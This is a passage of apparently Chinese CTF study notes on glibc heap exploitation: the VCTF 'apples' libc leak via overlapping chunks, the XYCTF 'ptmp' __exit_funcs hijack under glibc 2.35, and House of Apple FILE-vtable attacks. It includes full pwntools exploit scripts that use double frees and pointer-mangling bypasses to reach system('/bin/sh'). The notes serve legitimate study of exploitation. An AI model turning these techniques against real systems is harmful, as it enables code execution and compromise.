这个unsortedbin的chunk的大小就会被清空\",\"所以尝试其他思路\"]},\"144\":{\"h\":\"修改思路\",\"t\":[\"from pwn import * # r = process(\\\"./vuln\\\") r = gdb.debug(\\\"./vuln\\\",\\\"b *main+33\\\") class FakeChunk: def __init__(self): self.prev_size = p64(0) self.size = p64(0) self.fd = p64(0) self.bk = p64(0) self.payload = b\\\"\\\" self.next_chunk_prev_size = p64(0) def get_chunk_str(self): chunk = b\\\"\\\" chunk += self.prev_size chunk += self.size chunk += self.fd chunk += self.bk chunk += self.payload return chunk # 构造fake chunk 只需要:fake chunk的size 以及指针原本的位置 def set_chunk(self,size,ptr): self.prev_size = p64(0) self.size = p64(size +1) self.fd = p64(ptr-0x18) self.bk = p64(ptr-0x10) self.next_chunk_prev_size = p64(size) self.payload = (size - 32)*b\\\"a\\\" + self.next_chunk_prev_size print(f\\\"构造的chunk:\\\\n\\\\tprev_size:0\\\\n\\\\tsize:{ size }\\\\n\\\\tfd:{ hex(size +1) }\\\\n\\\\tbk:{ hex(ptr-0x10) }\\\\n\\\\tpatload长度:{ len(self.payload) }\\\\n\\\\t总长度:{ len(self.get_chunk_str()) }\\\") def waite_menu(): print(r.recvuntil(b\\\"Your choice:\\\")) def show(index): waite_menu() r.sendline(b\\\"2\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) def delete(index): waite_menu() r.sendline(b\\\"3\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(f\\\"------------------\\\\n删除index为{ index }的chunk\\\\n------------------\\\") def add(index,size,content): waite_menu() r.sendline(b\\\"1\\\") print(r.recvuntil(b\\\"Index: \\\")) r.sendline(str(index).encode()) print(r.recvuntil(b\\\"Size: \\\")) r.sendline(str(size)) print(r.recvuntil(b\\\"Content: \\\")) r.send(content) print(f\\\"------------------\\\\n添加index为{ index }的chunk\\\\n------------------\\\") # fake_chunk = FakeChunk() # fake_chunk.set_chunk(size=0xa8,) for i in range(10): print(\\\"i :\\\",i) add(i,0xa0,b\\\"\\\\x00\\\") for i in range(8): print(\\\"i :\\\",i) delete(i) add(0,0x90,b\\\"\\\\x00\\\") r.interactive() \",\"然后修改思路 最后的malloc变为malloc一个更小的chunk 这样机制会优先去寻找unsortedbin来切割出一个更小的chunk\"]},\"145\":{\"h\":\"结果\",\"t\":[\"最终让fd和bk写上了main_arean+88的地址了 但是我忽略了 在写入内容的时候最后加了一个0导致我们没办法读出来 内容被阶段了 (悲)\"]},\"146\":{\"h\":\"vctf apples leak libc操作复现(高版本的overlapping)\",\"t\":[\"题目中存在off_by_one libc版本2.34以上我们没办法使用常规的overlapping 泄露libc地址\",\"所以我们要精心构造一个chunk head来绕过新版本的检查机制 实现leak libc的操作\",\"文章中我们先讲原理 在最后会将Arahat0师傅的脚本给出来()\"]},\"147\":{\"h\":\"安全检查机制\",\"t\":[\"2.34下的合并检查机制\",\"检查size是否对得上\",\"image-20240325110240440\",\"unlink检查\",\"image-20240325110339049\"]},\"148\":{\"h\":\"利用原理\",\"t\":[\"这里先简单说一下我们要干什么\",\"后面详细说一下我们的利用流程\",\"构造一个chunkheader 让它的size fd bk都符合检查机制\"]},\"149\":{\"h\":\"利用\"},\"150\":{\"h\":\"构造chunk header\",\"t\":[\"主要是构造合法的size fd bk 我们把我们构造的chunk叫做fake chunk\",\"代码\",\"add(0x410, \\\"a\\\" * 8) # 0 290 add(0x100, \\\"a\\\" * 8) # 1 6b0 add(0x430, \\\"a\\\" * 8) # 2 7c0 add(0x430, \\\"a\\\" * 8) # 3 c00 add(0x100, \\\"a\\\" * 8) # 4 1040 add(0x480, \\\"a\\\" * 8) # 5 1150 add(0x420, \\\"a\\\" * 8) # 6 15e0 add(0x10, \\\"a\\\" * 8) # 7 1a10 free(0) free(3) free(6) # 触发合并 然后合成一个0x860的大chunk 让我们可以分割 # 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk free(2) # add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方 # 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头 add(0x450, b\\\"a\\\" * 0x438 + p16(0x551)) # 0 # 将 chunk3 变为allocted add(0x410, \\\"a\\\" * 8) # 2 add(0x420, \\\"a\\\" * 8) # 3 add(0x410, \\\"a\\\" * 8) # 6 \",\"free 3个chunk(chunk0 chunk3 chunk6) 这样chunk3(的fd和bk分别指向chunk 0 chunk6\",\"这里需要特殊说明 这里的chunk3的地址要特殊一些 也就是最低的地址为00 这样方便我们后面使用off_by_one漏洞来实现修改fd/bk的低地址为0来让FD->bk BK->fd 指向我们伪造的chunk (后面会详细说明)\",\"free 一个chunk 让两个chunk(chunk3 与chun2)合并 这样就保留了fd(chunk 0)和bk(chunk6)在一个大的chunk中\",\"然后我们将这个大chunk分割为chunk3 和chunk4 让我们自己构造的size刚好覆盖在原chunk3 size 位置 详细看下方图\",\"image-20240325111430446\",\"分割大chunk 并且构造size\",\"image-20240325111521964\",\"​\",\"这里我们已经成功构造好了 size和fd bk 那么后面我们就要想办法让chunk 0的bk 和chunk6的fd指向我们构造的chunk\"]},\"151\":{\"h\":\"构造FD->bk\",\"t\":[\"这里主要是利用先让chunk0的bk 指向chunk3 然后利用off_by_one漏洞覆写bk 指向我们的fake chunk\",\"代码\",\"# 覆写chunk0的fd free(6) #free的chunk 3 free(2) #free的chunk 0 add(0x410, \\\"a\\\" * 8) # 2 add(0x410, \\\"a\\\" * 8) # 6 \",\"示意图\",\"image-20240325114920279\"]},\"152\":{\"h\":\"构造BK->fd\",\"t\":[\"这里就要复杂一点了 因为修改chunk 6 的fd不能像修改FD->bk那样直接free 然后add\",\"我们需要利用 合并机制来修改 也就是先free chunk3 chunk 6 以及chunk5 触发chunk6和chunk5合并\",\"然后我们分割一个chunk 5出来 并且向原本chunk6 size fd位置赋值\",\"代码\",\"free(6) free(3) free(5) add(0x4f0, b\\\"b\\\" * 0x488 + p64(0x431)) # 3 add(0x3b0, \\\"a\\\" * 8) # 5 \",\"示意图\",\"image-20240325115900055\",\"add后\",\"image-20240325135125545\"]},\"153\":{\"h\":\"构造合并chunk\",\"t\":[\"这里就要简单很多了 就是利用一次合并机制和分割机制 造成prev_inuse变为0 并且构造好prev_size\",\"只不过我们还是得调整一下要选择合并的chunk的位置 因为我们刚才构造的fake chunk大小为0x550所以我们要在fake chunk往下0x550位置弄出一个 allocted chunk\",\"下面的解释其实有失偏颇 因为其实是我们专门计算的0x550这个数据 刚好对上一个chunk 但是为了方便理解我们选择倒推的方式\",\"代码\",\"free(4) add(0x108, b\\\"c\\\" * 0x100 + p64(0x550)) # 4 add(0x400, \\\"a\\\" * 8) # 6 free(3) add(0x10, \\\"a\\\" * 8) # 3 show(6) \",\"首先我们看一下 fakechunk 0x550偏移位置坐标在哪里\",\"image-20240325145741621\",\"image-20240325145825097\",\"根据地址我们知道 也就是我们要修改的chunk为chunk 5 那么我们就去free掉chunk 4(大小0x110)然后malloc回来 写入数据覆盖到chunk 5的prev_inuse 并且构造好0x550的prev_size\",\"示意图\",\"image-20240325150321671\",\"此时我们成功完成构造 最后只需要 free掉chunk 5触发合并机制 然后我们成功完成一次overlapping 可喜可贺\"]},\"154\":{\"h\":\"脚本\",\"t\":[\"from pwn import * # from pwncli import * # context(os='linux', arch='amd64', log_level='debug') context.terminal = ['tmux', 'sp', '-h'] context(os='linux', arch='amd64') local = 1 elf = ELF('./vuln') if local: p = gdb.debug('./vuln',\\\"b *main+57\\\") libc = ELF('./libc.so') else: p = remote('', 0) libc = ELF('./libc.so') sd = lambda s: p.send(s) sl = lambda s: p.sendline(s) sa = lambda n, s: p.sendafter(n, s) sla = lambda n, s: p.sendlineafter(n, s) rc = lambda n: p.recv(n) rl = lambda: p.recvline() ru = lambda s: p.recvuntil(s) ra = lambda: p.recvall() ia = lambda: p.interactive() uu32 = lambda data: u32(data.ljust(4, b\\\"\\\\x00\\\")) uu64 = lambda data: u64(data.ljust(8, b\\\"\\\\x00\\\")) def cmd(op): sla(\\\">> \\\", str(op)) def add(size, content): cmd(1) sla(\\\"How many students do you want to add: \\\", str(1)) sla(\\\"Gender (m/f): \\\", \\\"m\\\") sla(\\\"Size: \\\", str(size)) sa(\\\"Content:\\\", content) print(\\\"--------------\\\\nadd一个\\\\n--------------\\\") def show(index): # gender,content,size cmd(2) sla(\\\"Enter the index of the student: \\\", str(index)) cmd(2) print(\\\"--------------\\\\nshow一个\\\\n--------------\\\") def free(index): # gender,content,size cmd(3) sla(\\\"Enter the index of the student: \\\", str(index)) cmd(2) print(\\\"--------------\\\\n删除一个\\\\n--------------\\\") add(0x410, \\\"a\\\" * 8) # 0 290 add(0x100, \\\"a\\\" * 8) # 1 6b0 add(0x430, \\\"a\\\" * 8) # 2 7c0 add(0x430, \\\"a\\\" * 8) # 3 c00 add(0x100, \\\"a\\\" * 8) # 4 1040 add(0x480, \\\"a\\\" * 8) # 5 1150 add(0x420, \\\"a\\\" * 8) # 6 15e0 add(0x10, \\\"a\\\" * 8) # 7 1a10 free(0) free(3) free(6) # 触发合并 然后合成一个0x860的大chunk 让我们可以分割 # 并且我们的fd和bk在0x430+16字节的位置 也就是0x440位置存在fd和bk free(2) # add一个比chunk 0 chunk6都大的chunk这样就会去分割0x860chunk 然后我们控制我们的payload 设置一个size到原本size的地方 # 这样fd和bk分别指向chunk 0 和chunk 6 这样我们可以构造一个 合法的chunk head头 add(0x450, b\\\"a\\\" * 0x438 + p16(0x551)) # 0 # 将 chunk3 变为allocted add(0x410, \\\"a\\\" * 8) # 2 add(0x420, \\\"a\\\" * 8) # 3 add(0x410, \\\"a\\\" * 8) # 6 print(\\\"构造fake chunk成功\\\") free(6) free(2) add(0x410, \\\"a\\\" * 8) # 2 add(0x410, \\\"a\\\" * 8) # 6 print(\\\"构造FD->bk成功\\\") free(6) free(3) free(5) add(0x4f0, b\\\"b\\\" * 0x488 + p64(0x431)) # 3 add(0x3b0, \\\"a\\\" * 8) # 5 print(\\\"构造BK->fd成功\\\") free(4) add(0x108, b\\\"c\\\" * 0x100 + p64(0x550)) # 4 add(0x400, \\\"a\\\" * 8) # 6 free(3) add(0x10, \\\"a\\\" * 8) # 3 show(6) \"]},\"155\":{\"h\":\"xyctf ptmp的做题记录(glibc2.35下的exit函数打法)\"},\"156\":{\"h\":\"审题\",\"t\":[\"add函数 malloc一个0x18的chunk(0x20) 属性分别对应:size isUsed buff 并且仅在创建的时候可以写入数据 并且没有检测这个index是否在使用 所以我们可以对一个index无限malloc\",\"image-20240418005442527\",\"delete函数 直接free记录信息的chunk和我们的内容体chunk(buff) 并且没有清空\",\"image-20240418005502800\",\"view函数 直接write出size大小的内容 存在泄露\",\"image-20240418005523801\",\"atexit函数\",\"image-20240418131700409\"]},\"157\":{\"h\":\"大致利用原理:\",\"t\":[\"这里先粗略写一下原理 后面细讲 整个利用原理不算难但是细节很多很多地方需要微调\",\"泄露libc heap地址\",\"通过malloc 9个128 来申请0x90大小的chunk 然后free掉 让chunk进入unsortedbin中 再申请回来 通过write函数直接泄露libc地址 和heap地址\",\"伪造fake chunk（消耗topchunk触发fastbin的合并）\",\"或者通过向scanf输入大量数据触发fastbin合并 因为scanf在接受大量数据的时候会申请一个largebin\",\"因为题目中存在isUsed 有了这个就阻止了我们double free所以我们让记录头信息的chunk进入fastbin中 并且通过消耗空topchunk 触发fastbin的合并机制 让fastbin进入unsortedbin中 再通过分割机制 让原本的信息头chunk成为我们的内容chunk(buff) 通过向chunk写入内容来劫持信息头chunk 改写isUsed和buff指针 来实现任意地址的free 从而实现double free\",\"劫持__exit_funcs链表 实现在exit的时候任意函数的调用 通过两次double free 第一次泄露tls中的key 第二次负责修改__exit_funcs链表\",\"大概思路:exit()分析与利用-安全客 - 安全资讯平台 (anquanke.com)\",\"[原创] Glibc-2.35下对tls_dtor_list的利用详解-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"这俩个大佬提供了两种思路 我这边采用的Arahat0佬的劫持__exit_funcs链表的方式\"]},\"158\":{\"h\":\"泄露libc heap\",\"t\":[\"最简单的一步\",\"简单地通过让chunk进入tcache中 然后申请回来利用chunk中保留有关libc和heap的地址然后推算出libc基地址和heap基地址\",\"for i in range(9): add(i,128,b\\\"a\\\"*0x18) for i in range(9): delete(i) # 泄露出chunk add(0,0x68,b\\\"a\\\"*8) res = view(0) base_heap = u64(res[2*8:3*8]) -1936 base_libc = u64(res[5*8:6*8]) -2206944 \",\"chunk进入unsortedbin\",\"image-20240418132947766\",\"free 8时 unsortedbin进入topchunk 但是此时保留了fd 等信息 我们只需要malloc回来即可\",\"image-20240418133015055\",\"申请回来\",\"image-20240418133239908\",\"然后write直接泄露即可\"]},\"159\":{\"h\":\"伪造fake chunk\",\"t\":[\"最消耗时间的一步\",\"这里比较麻烦的就是fakechunk 这里我们将记录信息的chunk称之为头chunk 记录内容chunk的size isUsed point\",\"point指向的就是内容chunk\",\"为了绕过isUsed的检测 我们可以利用delete后没有清空的特性将原本的头chunk覆盖掉 这样就能随意控制isUsed和point了 实现任意free 所以我们选择触发fastbin的合并 来让原本的头chunk之间相互合并 然后我们通过malloc指定大小的chunk来分割这个chunk 控制内容chunk刚好为原本某一个的头chunk\"]},\"160\":{\"h\":\"示意图\",\"t\":[\"image-20240418134333731\",\"这样我们就可以向content chunk写入内容劫持head chunk了 原理很简单 但是现在就要想办法触发fastbin中的合并机制了\"]},\"161\":{\"h\":\"fastbin合并机制\",\"t\":[\"范围:2.35\",\"我们可以通过申请large bin chunk 来触发合并\",\"我们可以通过让topchunk消耗完毕 然后触发合并\",\"由于我们最大申请128 也就是0x90大小的chunk 显然第一种我们是没办法直接申请large chunk\",\"Arahat0师傅提醒俺 我们可以通过向scanf输入大量数据 来让scanf malloc一个large chunk 然后触发合并 但是同时也会导致缓冲区一堆数据导致后续的scanf失灵 所以为了方便控制 我选择了将topchunk消耗完毕触发合并的方式\",\"连续申请大量chunk 消耗topchunk到size为一个较小值 然后在最后申请chunk 并且free chunk 让chunk进入fastbin链中 然后malloc一个较大的chunk 彻底消耗topchunk 触发fastbin的合并\",\"# tcache 0x20 0x90均存满 # 剩下0xf3c7d0 for i in range(760): add(14,128,b\\\"a\\\"*0x18) for i in range(6): add(i,0x18,b\\\"a\\\"*0x8) # 防止fastbin合并后直接被topchunk合并 add(7,8,b\\\"a\\\"*8) for i in range(6): delete(i) add(14,128,b\\\"a\\\"*8) add(14,0x30,b\\\"a\\\"*8) \",\"合并之前\",\"image-20240418151026231\",\"合并后\",\"image-20240418151102406\"]},\"162\":{\"h\":\"构造fakecchunk\",\"t\":[\"fakechunk = {} fakechunk[\\\"size\\\"] = p64(0x21) fakechunk[\\\"prev_size\\\"] = p64(0) fakechunk[\\\"chunk_list_size\\\"] = p64(0x100) fakechunk[\\\"isUsed\\\"] = p64(1) // 为触发泄露tls+0x30的double free的fastbinchunk地址 fakechunk[\\\"buff\\\"] = p64(fd) # 已经完成覆写 free index5则可实现任意free add(14,0x58,b\\\"a\\\"*16+fakechunk[\\\"prev_size\\\"]+fakechunk[\\\"size\\\"]+fakechunk[\\\"chunk_list_size\\\"]+fakechunk[\\\"isUsed\\\"]+fakechunk[\\\"buff\\\"]) \",\"此时index为5 就是我们劫持的头chunk 这里的fd就是我们后面要free的任意chunk\",\"image-20240418151731938\"]},\"163\":{\"h\":\"泄露tls+0x30\",\"t\":[\"由于要泄露tls+0x30处的地址 从而来泄露出key值 方便我们去劫持exit_funcs链表 所以我们需要构造一个double free来malloc下来tls附近的内存区域\",\"难点\",\"我们需要控制内存对齐 并且还不能破坏到了canary的值 所以我们double free劫持的chunk大小需要够大\",\"实践发现这样会导致tcache中它标注的chunk数量和实际的数量并不对应 如果直接将fd填写为tls处地址 后续的malloc失效 因为tls处的fd位置我们并没有办法控制 大概率会是内存不对齐/内存不可写 所以我们需要后续的malloc\",\"glibc2.35下存在fd加密机制 我们的fd需要经过与(base_heap>>12)进行异或操作 才是合法的fd才能够被正常解析 而且经过测试仿佛这里的base_heap会因为我们消耗topchunk一次而发生细微的改变 所以需要gdb手动调试计算出偏差\",\"# 构造一个double free for i in range(6,11): add(i,0x18,b\\\"a\\\"*16) # 这个chunk是以前为了当作跳板的chunk 但是后面切换了思路没有用了 为了不影响后续的heap计算就没有删除 add(14,0x68,p64(0)+p64(0x100)+p64((xor-0x21)^(tls+0x30))) for i in range(6,11): delete(i) delete(5) for i in range(7): add(i,0x48,b\\\"a\\\"*8) add(7,0x48,p64((xor)^(tls))) for i in range(2): add(i,0x48,b\\\"a\\\"*8) add(0,0x48,b\\\"\\\\x00\\\") # 泄露tls中信息 res = view(0) \",\"首先是在fastbin上构造出两个以上的chunk 然后free第二个chunk 来绕过fastbin中检查double free的机制（fastbin会检查你free的是否为第一个chunk）\",\"if (__builtin_expect(old == p, 0)) malloc_printerr(\\\"double free or corruption (fasttop)\\\"); p->fd = PROTECT_PTR(&p->fd, old); *fb = p; \",\"image-20240420123457567\",\"然后将利用开始构造好的fakechunk进行free\",\"delete(5) \",\"image-20240420123602766\"]},\"164\":{\"h\":\"fd加密机制\",\"t\":[\"glibc高版本加入的fd加密机制 让我们没办法直接覆盖fd 绕过也很简单泄露heap地址即可\",\"fd需要是heap基地址^目标地址\"]},\"165\":{\"h\":\"劫持exit_funcs链表\",\"t\":[\"最难崩的一步 因为我们需要劫持这个链表所以我们需要再一次触发fastbin的合并构造double free 然后指向exit_func处 进行覆写\",\"本地打这个感觉还行 但是打远程的时候我脚本足足要跑20分钟 并且还因为比赛方平台网络不是特别好 导致我反复失败 最终跑了一晚上才跑出来\",\"难点 \",\"因为上一次double free 导致tcache 中一条链已经存在一个无效的chunk地址(大概率不对齐) 所以我们下一次double free的时候就不能选择这个size大小的链了\",\" # size: 0x20c30 for i in range(758): add(14,128,b\\\"a\\\"*8) for i in range(11): add(i,0x18,b\\\"a\\\"*8) add_with_no_chunk(14) for i in range(11): delete(i) # 将topchunk消耗空触发合并 add(14,0x68,b\\\"a\\\"*8) # 指定free index 6 可以实现任意free # free_chunk就是后续构造double free的chunk地址 free_chunk = base_heap+271376+0x10 add(14,128,b\\\"a\\\"*8*4+p64(0)+p64(0x31)+p64(0x100)+p64(1)+p64(free_chunk)) # 填写binsh只是为了后续调用system函数的时候可以找个地址来当作参数 for i in range(6): add(i,0x68,b\\\"/bin/sh\\\\x00\\\") for i in range(7,13): add(i,0x68,b\\\"/bin/sh\\\\x00\\\") for i in range(6): delete(i) for i in range(7,13): delete(i) # 触发double free delete(6) for i in range(7): add(i,0x68,b\\\"a\\\"*8) # 将fd指向exit_function地址处 add(i,0x68,p64((xor+0x21)^exit_function)) add(0,0x68,b\\\"a\\\"*8) add(0,0x68,b\\\"/bin/sh\\\\x00\\\") res = getData(res) # 获取key的值 res = res[6] # 计算出key加密后的地址 manba = remove_high_digits(rol(0x401700^res),16) addr = remove_high_digits(rol(system_addr^res),16) print(\\\"key:\\\",hex(res)) print(\\\"libc_base\\\",hex(base_libc)) print(\\\"heap_base\\\",hex(base_heap)) print(\\\"system_addr\\\",hex(system_addr)) print(\\\"exit_function:\\\",hex(exit_function)) print(\\\"addr\\\",hex(addr)) add(0,0x68,p64(4)+p64(addr)+p64(base_heap+0x42420)) ru(b\\\">>> \\\") sl(b\\\"5\\\") print(\\\"key:\\\",hex(res)) print(\\\"libc_base\\\",hex(base_libc)) print(\\\"heap_base\\\",hex(base_heap)) print(\\\"system_addr\\\",hex(system_addr)) print(\\\"exit_function:\\\",hex(exit_function)) print(\\\"addr\\\",hex(addr)) ia() \"]},\"166\":{\"h\":\"house of apple 原理细学习\"},\"167\":{\"h\":\"参考文章:\",\"t\":[\"[原创] House of apple 一种新的glibc中IO攻击方法 (1)-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"glibc 2.35 pwn——house of apple v1 示例程序_pwn house of apple-CSDN博客\"]},\"168\":{\"h\":\"条件\",\"t\":[\"触发exit函数 / main函数返回\",\"泄露heap地址 libc地址\",\"可进行largebin attack\"]},\"169\":{\"h\":\"house_of_apple1原理\",\"t\":[\"这里阅读了大致逻辑后进行总结\",\"首先是通过一次largebin劫持_IO_list_all 伪造\",\"构造时将vatble填写_IO_wstrn_jumps\",\"触发exit函数 exit调用_IO_flush_all_lockp（原本会遍历所有的File结构体依次执行overflow函数）由于我们劫持了vtable 所以最终调用了_IO_wstrn_overflow函数 会将File结构体中的_wide_data字段保存的地址附近写入值\"]},\"170\":{\"h\":\"覆盖vatble\",\"t\":[\"也就是覆盖FILE结构体0xd8偏移位置的数据 为_IO_wstrn_jumps地址\",\"image-20240423173604690\"]},\"171\":{\"h\":\"触发exit\",\"t\":[\"fcloseall\",\"image-20240423194735581\",\"_IO_cleanup\",\"image-20240423194855564\"]},\"172\":{\"h\":\"调用_IO_wstrn_overflow\",\"t\":[\"_IO_wstrn_jumps:\",\"image-20240423173959024\",\"提取vatble(_IO_wstrn_jumps)调用overflow\",\"image-20240423174606432\",\"调用_IO_wstrn_jumps的_IO_wstrn_overflow函数\",\"image-20240423174817889\"]},\"173\":{\"h\":\"覆写数据\",\"t\":[\"根据_IO_wstrn_overflow可以知道fp->_wide_data地址所指区域会被覆写上overflow_buff 我们结合结构体来理解一下\",\"可以发现_wide_data位于偏移0xa0 其中_wide_data偏移从0x0到0x30地址处都会被覆写上fp->overflow_buf(偏移0xf0)\",\"那么就是我们构造的FILE结构体 vtable(0xd8)写上_IO_wstrn_jumps地址 overflow_buf(0xf0)写上我们想要覆盖的数据 比如\",\"backdoor地址之类的 _wide_data(0xa0)覆盖上我们想要修改的地址 那么最终就会在目标地址0x0到0x30处覆盖上我们的0xf0偏移处的数据\"]},\"174\":{\"h\":\"结构体 _IO_FILE_complete\",\"t\":[\"这个结构体包含了_IO_FILE结构体全部内容\",\"struct _IO_FILE_complete { struct _IO_FILE _file; #endif __off64_t _offset; /* Wide character stream stuff. */ struct _IO_codecvt *_codecvt; struct _IO_wide_data *_wide_data; struct _IO_FILE *_freeres_list; void *_freeres_buf; size_t __pad5; int _mode; /* Make sure we don't get into trouble again. */ char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)]; }; \",\"image-20240423181313898\"]},\"175\":{\"h\":\"结构体 _IO_wide_data\",\"t\":[\"struct _IO_wide_data { wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable; }; \",\"查看一下偏移 gdb使用指令:p *&_IO_wide_data_0和tel &_IO_wide_data_0\",\"image-20240423181623582\"]},\"176\":{\"h\":\"结构体 _IO_wstrnfile\",\"t\":[\"typedef struct { _IO_strfile f; /* This is used for the characters which do not fit in the buffer provided by the user. */ wchar_t overflow_buf[64]; } _IO_wstrnfile; \"]},\"177\":{\"h\":\"示意图\",\"t\":[\"image-20240425164628090\"]},\"178\":{\"h\":\"house_of_apple 2原理\",\"t\":[\"学习文章:[原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com\",\"核心还是劫持vtable 只不过需要绕过一下新版本中对vtable地址的检测 这里主要是讲一下原理 其他部分还是主要做题遇到再查\"]},\"179\":{\"h\":\"_IO_OVERFLOW调用\",\"t\":[\"#define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH) #define JUMP1(FUNC, THIS, X1) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1) #define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS))) \",\"我们可以发现这个调用最终会调用IO_validate_vtable 然后会触发检查vatble是否合法 所以我们得想办法绕过\"]},\"180\":{\"h\":\"_IO_wfile_overflow的调用\",\"t\":[\"这个函数存在于 _IO_wfile_jumps ,_IO_wfile_jumps_mmap和_IO_wfile_jumps_maybe_mmap等虚表中 所以我们的vtable直接填写这三个中任意一个即可 我们可以发现调用这个的时候并不存在vatble的检查 这样我们就可以轻松愉快地劫持vatble了\",\"const struct _IO_jump_t _IO_wfile_jumps libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_new_file_finish), // koko da you JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow), JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow), JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow), JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail), JUMP_INIT(xsputn, _IO_wfile_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_wfile_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_new_file_setbuf), JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync), JUMP_INIT(doallocate, _IO_wfile_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; const struct _IO_jump_t _IO_wfile_jumps_mmap libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_new_file_finish), // koko da you JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow), JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_mmap), JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow), JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail), JUMP_INIT(xsputn, _IO_wfile_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_wfile_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_file_setbuf_mmap), JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync), JUMP_INIT(doallocate, _IO_wfile_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close_mmap), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; const struct _IO_jump_t _IO_wfile_jumps_maybe_mmap libio_vtable = { JUMP_INIT_DUMMY, JUMP_INIT(finish, _IO_new_file_finish), // koko da you JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow), JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow_maybe_mmap), JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow), JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail), JUMP_INIT(xsputn, _IO_wfile_xsputn), JUMP_INIT(xsgetn, _IO_file_xsgetn), JUMP_INIT(seekoff, _IO_wfile_seekoff), JUMP_INIT(seekpos, _IO_default_seekpos), JUMP_INIT(setbuf, _IO_file_setbuf_mmap), JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync), JUMP_INIT(doallocate, _IO_wfile_doallocate), JUMP_INIT(read, _IO_file_read), JUMP_INIT(write, _IO_new_file_write), JUMP_INIT(seek, _IO_file_seek), JUMP_INIT(close, _IO_file_close), JUMP_INIT(stat, _IO_file_stat), JUMP_INIT(showmanyc, _IO_default_showmanyc), JUMP_INIT(imbue, _IO_default_imbue) }; \",\"我们看看这个函数的调用链\",\"#define _IO_WOVERFLOW(FP, CH) WJUMP1 (__overflow, FP, CH) #define WJUMP1(FUNC, THIS, X1) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS, X1) #define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS) #define _IO_WIDE_JUMPS(THIS) \\\\ _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable \",\"我们可以发现这里就没有vatble的检查了\",\"所以我们可以将 vtable改为_IO_wfile_jumps(加减偏移) 触发exit函数\",\"这样就会调用_IO_wfile_overflow函数\",\"以及我们发现这里调用的是_wide_data->_wide_vatble 已经知道_wide_data相对于File结构体来说偏移值为0xa0 我们可以在伪造的File结构体0xa0位置填写上可控的一个chunk地址 这个chunk写上我们想要调用的函数\"]},\"181\":{\"h\":\"示意图\",\"t\":[\"总结就是(仅伪造_wide_data) 我们要伪造三个chunk 一个在_wide_data(0xa0)位置写入指针指向第二个chunk 然后第二个chunk要在_wide_vtable（0xe0）位置写第三个chunk 0x18位置写入我们要触发的函数 这样就完成了一次函数的劫持\",\"image-20240425165104955\"]},\"182\":{\"h\":\"原理脚本\",\"t\":[\"这里贴出[原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com文章中的脚本\",\"关于_IO_FILE_plus结构体部分\",\"_flags 